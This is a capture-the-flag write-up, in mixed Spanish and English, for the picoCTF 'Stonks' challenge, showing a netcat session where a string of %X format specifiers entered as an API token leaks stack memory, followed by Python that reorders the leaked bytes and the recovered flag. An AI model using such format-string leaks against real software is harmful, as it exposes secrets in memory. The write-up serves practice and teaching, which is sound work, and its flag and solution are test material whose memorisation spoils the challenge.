# Stonks
## Descripcipción
I decided to try something noone else has before. I made a bot to automatically trade stonks for me using AI and machine learning. I wouldn't believe you if you told me it's unsecure! [vuln.c](https://mercury.picoctf.net/static/62f47b5b65ec7eadb96c4e34f016f68d/vuln.c) `nc mercury.picoctf.net 53437`
## Pistas
- Okay, maybe I'd believe you if you find my API key.
## Solucion
```
(base) ┌──(alexia㉿alexHM)-[~/Downloads]
└─$ nc mercury.picoctf.net 53437
Welcome back to the trading app!

What would you like to do?
1) Buy some stonks!
2) View my portfolio
1
Using patented AI algorithms to buy stonks
Stonks chosen
What is your API token?
%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X
Buying stonks with token:
82703D0804B00080489C3F7EC5D80FFFFFFFF1826E160F7ED3110F7EC5DC70826F180382703B082703D06F6369707B465443306C5F49345F74356D5F6C6C306D5F795F79336E3463646261653532FFE4007DF7F00AF8F7ED3440B0F4100010F7D62CE9F7ED40C0F7EC55C0F7EC5000FFE4F978F7D5368DF7EC55C08048ECA
Portfolio as of Sat May 13 01:04:40 UTC 2023


3 shares of PPQ
10 shares of OIV
1 shares of EGST
48 shares of RXER
72 shares of RJ
24 shares of R
123 shares of QYM
Goodbye!
______________________________________________________________________________
								python
______________________________________________________________________________
Python 3.10.10 (main, Mar 21 2023, 18:45:11) [GCC 11.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> s='ocip{FTC0l_I4_t5m_ll0m_y_y3n4cdbae52ÿä'
>>> for x in range(0,len(s),4):
...     print(s[x+3]+s[x+2]+s[x+1]+s[x],end='')
... 
Traceback (most recent call last):
  File "<stdin>", line 2, in <module>
IndexError: string index out of range
picoCTF{I_l05t_4ll_my_m0n3y_bdc425ea>>> 
```
## Bandera
picoCTF{I_l05t_4ll_my_m0n3y_bdc425ea}
## Notas adicionales
## Referencias


